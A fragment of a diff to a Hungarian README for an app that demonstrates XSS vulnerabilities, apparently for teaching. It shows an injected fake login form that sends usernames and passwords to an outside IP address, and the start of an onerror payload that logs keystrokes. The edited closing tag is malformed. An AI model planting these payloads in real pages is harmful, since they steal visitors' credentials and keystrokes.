@@ -14,12 +14,12 @@ Ez az alkalmazás háromféle XSS sebezhetőséget demonstrál:
 5. npm start
 
 
-<form action="http://172.18.193.203" method="post"> 
+<code><form action="http://172.18.193.203" method="post"> 
 <label for="username">Felhasználó:</label><br> 
 <input type="text" id="username" name="username"><br><br> 
 <label for="password">Jelszó:</label><br> 
 <input type="password" id="password" name="password"><br><br> <input type="submit" value="Belépés"> 
-</form>
+</form></form>code>
 
 <img src=x onerror="(() => {
   document.onkeypress = function(e) {
